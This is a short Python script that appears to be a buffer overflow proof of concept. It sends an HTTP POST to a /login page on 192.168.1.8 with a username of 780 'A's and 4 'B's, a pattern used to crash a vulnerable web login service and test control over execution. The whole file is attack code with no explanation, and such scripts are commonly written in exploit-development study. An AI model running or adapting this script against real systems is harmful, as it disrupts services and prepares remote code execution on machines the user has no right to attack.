#!/usr/bin/python

import socket

import os

import sys

crash = "A" * 780 + "B" * 4

fuzz = "username=" + crash + "&password=A"

buffer = "POST /login HTTP/1.1\r\n"

buffer +="Host: ip\r\n"

buffer +="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"

buffer +="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"

buffer +="Accept-Language: en-US,en;q=0.5\r\n"

buffer +="Referer: http://ip/login\r\n"

buffer +="Connection: close\r\n"

buffer +="Content-Type: application/x-www-form-urlencoded\r\n"

buffer +="Content-Length: "+str(len(fuzz))+"\r\n"

buffer +="\r\n"

buffer +=fuzz

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

expl.connect(("192.168.1.8", 80))

expl.send(buffer)

expl.close()